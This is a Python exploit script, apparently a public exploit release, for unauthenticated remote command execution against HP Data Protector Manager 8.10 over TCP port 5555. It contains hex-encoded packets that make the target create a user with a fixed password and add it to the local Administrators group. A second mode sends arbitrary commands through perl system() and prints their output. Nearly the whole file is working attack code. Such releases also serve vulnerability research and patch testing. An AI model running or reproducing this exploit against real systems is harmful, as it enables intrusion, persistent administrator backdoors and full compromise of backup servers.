#!/usr/bin/python
 
# Exploit Title: HP-Data-Protector-8.10 Remote command execution.
# Date: July 11 2014
# Exploit Author: Christian (Polunchis) Ramirez https://intrusionlabs.org
# Exploit Author: Henoch (Chanoc) Barrera       https://intrusionlabs.org
# Contacts: polunchis@intrusionlabs.org and chanoc@intrusionlabs.org
# Version: HP Data Protector manager 8.10 the last version
# Vendor web page: http://www8.hp.com/mx/es/software-solutions/software.html?compURI=1175640#.U8DhWaU_BjF
# Tested on: Windows 2003, Windows 2008 and Windows 2012 all languages 
# Thanks:To GOD for giving us wisdom      
# Description: 
# A remote command execution is triggered when craft command is sent to the Hp Data Protector Manager to tcp port 5555.

import socket
import struct
import sys

#net user Poc l@bs.og /add
shellusr = ("\x00\x00\x01\x3c\xff\xfe\x32\x00\x00\x00\x20\x00\x68\x00\x70\x00"
"\x64\x00\x70\x00\x31\x00\x00\x00\x20\x00\x30\x00\x00\x00\x20\x00"
"\x00\x00\x20\x00\x00\x00\x20\x00\x45\x00\x4e\x00\x55\x00\x00\x00"
"\x20\x00\x31\x00\x31\x00\x00\x00\x20\x00\x45\x00\x58\x00\x45\x00"
"\x43\x00\x5f\x00\x42\x00\x41\x00\x52\x00\x00\x00\x20\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00"
"\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00"
"\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x00\x00\x20\x00\x63\x00\x3a\x00\x5c\x00\x77\x00\x69\x00"
"\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x5c\x00\x73\x00\x79\x00"
"\x73\x00\x74\x00\x65\x00\x6d\x00\x33\x00\x32\x00\x5c\x00\x63\x00"
"\x6d\x00\x64\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x20\x00"
"\x00\x00\x20\x00\x2f\x00\x63\x00\x20\x00\x6e\x00\x65\x00\x74\x00"
"\x20\x00\x75\x00\x73\x00\x65\x00\x72\x00\x20\x00\x50\x00\x6f\x00"
"\x63\x00\x20\x00\x6c\x00\x40\x00\x62\x00\x73\x00\x2e\x00\x6f\x00"
"\x67\x00\x20\x00\x2f\x00\x61\x00\x64\x00\x64\x00\x00\x00\x00\x00")

#net user local group Administrators Poc /add
shellgrp = ("\x00\x00\x01\x56\xff\xfe\x32\x00\x00\x00\x20\x00\x68\x00\x70\x00"
"\x64\x00\x70\x00\x31\x00\x00\x00\x20\x00\x30\x00\x00\x00\x20\x00"
"\x00\x00\x20\x00\x00\x00\x20\x00\x45\x00\x4e\x00\x55\x00\x00\x00"
"\x20\x00\x31\x00\x31\x00\x00\x00\x20\x00\x45\x00\x58\x00\x45\x00"
"\x43\x00\x5f\x00\x42\x00\x41\x00\x52\x00\x00\x00\x20\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00"
"\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00"
"\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x00\x00\x20\x00\x63\x00\x3a\x00\x5c\x00\x77\x00\x69\x00"
"\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x5c\x00\x73\x00\x79\x00"
"\x73\x00\x74\x00\x65\x00\x6d\x00\x33\x00\x32\x00\x5c\x00\x63\x00"
"\x6d\x00\x64\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x20\x00"
"\x00\x00\x20\x00\x2f\x00\x63\x00\x20\x00\x6e\x00\x65\x00\x74\x00"
"\x20\x00\x6c\x00\x6f\x00\x63\x00\x61\x00\x6c\x00\x67\x00\x72\x00"
"\x6f\x00\x75\x00\x70\x00\x20\x00\x41\x00\x64\x00\x6d\x00\x69\x00"
"\x6e\x00\x69\x00\x73\x00\x74\x00\x72\x00\x61\x00\x74\x00\x6f\x00"
"\x72\x00\x73\x00\x20\x00\x50\x00\x6f\x00\x63\x00\x20\x00\x2f\x00"
"\x61\x00\x64\x00\x64\x00\x00\x00\x00\x00")

def connect_target(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as err:
        print
        "[-]Close Socket! CODE: %d MSG: %s" % (err[0], err[1])
        return -1

    try:
        sock.connect((target, port))
    except socket.error as err:
        print
        "[-] It cannot connect to the target! CODE: %d MSG: %s" % (err[0], err[1])
        return -1
    return sock

def send_recv_packet(sock, packet):
    sock.sendall(packet)
    res = sock.recv(4096)
    return res
print """
[*] https://intrusionlabs.org 
"""
print "[*] Choose a valid option"
print """
[1] Run remote commands 
[2] Add Poc user to Administrators group with password l@bs.og
"""
opcion= raw_input("Choose an option i.e.  1 or 2:  ")
if opcion.isdigit():
      opcion = int(opcion)

if opcion == 1:
 ip_remota= raw_input("IP Address: ")
 port= raw_input("Port: ")
 command= raw_input("command: ")
 if port.isdigit():
   port = int(port)
 else:
     print "Please provide a tcp port"

 objetivo = connect_target(ip_remota, port)
 if objetivo == -1: exit()
    
 OFFSET = 46
 command = command.replace("\\", "\\\\")
 command_tmno = chr(OFFSET + len(command))
 shell = "\x00\x00\x00"   +\
     command_tmno         +\
     "\x32\x00\x01"       +\
     "\x01\x01\x01"       +\
     "\x01\x01\x00"       +\
     "\x01\x00\x01"       +\
     "\x00\x01\x00"       +\
     "\x01\x01\x00"       +\
     "\x2028\x00"         +\
     "\\\x70\x65\x72"     +\
     "\x6c\x2e\x65\x78"   +\
     "\x65\x00 \x2d\x65"  +\
     "\x73\x79\x73\x74\x65\x6d" +\
     "('%s')\x00" % command
 print >> sys.stderr, "[+] Sending the payload with the command: '%s'" % command
 datos = send_recv_packet(objetivo, shell)  # Parse the response back
 print >> sys.stderr, "[+] Output:"
 while True:
        # Get information about response
        tmno_respuesta = objetivo.recv(4)
        if not tmno_respuesta: break
        n = struct.unpack(">I", tmno_respuesta)[0]
        respuesta = objetivo.recv(n)
        respuesta = respuesta[5:].strip()
        respuesta = respuesta.replace("\n", "")
        respuesta = respuesta.replace("\x00", "")
        if respuesta.upper().find("*RETVAL*") != -1:
            break
        print respuesta
   
 objetivo.close()
 print >> sys.stderr, "print [!] Port close...\r"

elif opcion == 2:
 ip_remota= raw_input("IP Address: ")
 port= raw_input("\nPort: ")
 if port.isdigit():
   port = int(port)
 else:
     print "Please provide a tcp port"

 print
 "\n [*]Creating P0c user and try to add it to Administrators group"

 #Get information about response
 print "\n[*]Attempting to create Poc user and try to add it to Administrators group with password l@bs.og"
 for packet in [shellusr, shellgrp]:
     target = connect_target(ip_remota, port)
     if target == -1: exit()
     data = send_recv_packet(target, packet)
     print "[*]SERVER RESPONSE: " + \
     data.split("\xFF\xFE\x31\x00\x35\x00\x00\x00\x20\x00")[1].lstrip("\x07\x00\x01\x00").rstrip("$")
     target.close()

else: print "Please provide a valid option i.e. 1 or 2"
            
